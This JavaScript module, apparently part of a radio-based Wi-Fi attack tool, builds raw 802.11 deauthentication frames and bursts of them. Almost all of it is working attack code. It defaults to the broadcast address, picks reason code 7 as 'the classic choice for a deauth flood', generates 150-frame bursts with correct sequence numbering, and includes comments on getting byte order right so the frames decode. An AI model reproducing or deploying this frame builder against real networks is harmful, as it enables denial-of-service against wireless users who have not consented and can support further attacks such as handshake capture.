// attack.js — stage 4. Builds the frames the radio transmits.
//
// The firmware stays a dumb transmitter: it takes bytes and puts them on the
// air. The frame is built here, where it can be tested against tshark on the
// bench without a radio ever being involved. That is not fussiness — building
// it here is what caught the reason-code byte order below, which the reference
// implementation gets wrong.
//
// Pure function of its arguments: no transport, no DOM, no device.

/** Deauthentication management subtype. */
export const SUBTYPE_DEAUTH = 0x0c;

/**
 * Reason codes worth being able to name. The first octet of the frame control
 * gets `(subtype << 4)`, so a deauth is 0xC0 on the wire.
 *
 * 7 is the classic choice for a deauth flood: the AP "received a Class 3 frame
 * from a nonassociated station", which is exactly what a client believes it is
 * seeing. 1 (unspecified) is the blunt alternative.
 */
export const REASON = {
  1: 'Unspecified',
  2: 'Previous authentication no longer valid',
  3: 'Sending STA is leaving',
  4: 'Disassociated due to inactivity',
  5: 'AP unable to handle all associated STAs',
  6: 'Class 2 frame from nonauthenticated STA',
  7: 'Class 3 frame from nonassociated STA',
  8: 'Sending STA is leaving the BSS',
  9: 'STA not authenticated with responding STA',
  15: '4-Way Handshake timeout',
  16: 'Group Key Handshake timeout',
  23: 'IEEE 802.1X authentication failed',
};

const HEX2 = /^[0-9a-f]{2}$/i;

/** "aa:bb:cc:dd:ee:ff" -> Uint8Array(6). Throws on anything else. */
export function macToBytes(mac) {
  if (typeof mac !== 'string') throw new Error('mac must be a string');
  const parts = mac.trim().split(':');
  if (parts.length !== 6) throw new Error(`mac needs 6 octets: ${mac}`);
  const out = new Uint8Array(6);
  for (let i = 0; i < 6; i++) {
    if (!HEX2.test(parts[i])) throw new Error(`bad mac octet "${parts[i]}" in ${mac}`);
    out[i] = parseInt(parts[i], 16);
  }
  return out;
}

export function bytesToMac(b) {
  return Array.from(b).map((x) => x.toString(16).padStart(2, '0')).join(':');
}

export const BROADCAST = 'ff:ff:ff:ff:ff:ff';

/**
 * Build one 26-byte deauthentication frame.
 *
 * 24-byte 802.11 header + 2-byte reason code, and deliberately **no FCS** —
 * the radio adds it. Layout:
 *
 *   0      0xC0        frame control: mgmt (2<<2) | deauth (0x0c << 4)
 *   1      0x00        flags: DS bits clear, no retry/protected/order
 *   2-3    0x0000      duration
 *   4-9    client      addr1 = DA
 *   10-15  bssid       addr2 = SA
 *   16-21  bssid       addr3 = BSSID
 *   22-23  seq << 4    sequence control, little-endian
 *   24-25  reason      little-endian
 *
 * The DS bits are clear and all three addresses are present, which is the
 * relationship the analyzer depends on reading back — a deauth sent as
 * {toDS,fromDS} = {0,0} is a direct frame, so addr1 is the destination, addr2
 * the source and addr3 the BSSID.
 *
 * **The reason code is little-endian.** Every 802.11 fixed field is. The bug
 * this guards against: writing the reason to the high byte (byte 25) instead of
 * byte 24, which is what `NRSuite` does — tshark then reads the reason as
 * 0x0700, "Unknown", instead of 0x0007. Many APs ignore the reason so it goes
 * unnoticed in the field, which is exactly why it is worth a test.
 */
export function buildDeauth({ bssid, client = BROADCAST, reason = 7, seq = 1 } = {}) {
  const b = macToBytes(bssid);
  const c = macToBytes(client);
  if (!Number.isInteger(reason) || reason < 0 || reason > 255) {
    throw new Error(`reason must be 0..255, got ${reason}`);
  }
  if (!Number.isInteger(seq) || seq < 0 || seq > 0xfff) {
    throw new Error(`seq must be 0..4095, got ${seq}`);
  }

  const f = new Uint8Array(26);
  f[0] = 0xc0;                                   // mgmt, deauth
  f[1] = 0x00;                                   // no flags
  f[2] = 0x00; f[3] = 0x00;                      // duration
  f.set(c, 4);                                   // addr1  DA
  f.set(b, 10);                                  // addr2  SA
  f.set(b, 16);                                  // addr3  BSSID
  // `seq` is the sequence *number*; the low nibble is the fragment number, and
  // these frames are never fragmented, so it stays zero.
  const sc = (seq << 4) & 0xffff;
  f[22] = sc & 0xff;
  f[23] = (sc >> 8) & 0xff;
  f[24] = reason & 0xff;                         // little-endian: low byte first
  f[25] = 0x00;
  return f;
}

/**
 * A burst, with the sequence number stepping exactly as it does on the wire.
 *
 * The sequence control field holds a 12-bit sequence number in bits 4-15 and a
 * 4-bit fragment number in bits 0-3. The *number* increments by one per frame;
 * encoding it is what shifts it left by four. Increment the encoded word by 1
 * instead and the fragment nibble runs to 15 and wraps, which tshark reports as
 * fragmented frames.
 */
export function buildBurst({ bssid, client = BROADCAST, reason = 7, count = 150, seq = 1 } = {}) {
  if (!Number.isInteger(count) || count < 1 || count > 2000) {
    throw new Error(`count must be 1..2000, got ${count}`);
  }
  const frames = [];
  let s = seq;
  for (let i = 0; i < count; i++) {
    frames.push(buildDeauth({ bssid, client, reason, seq: s }));
    s = (s + 1) & 0xfff;
  }
  return frames;
}
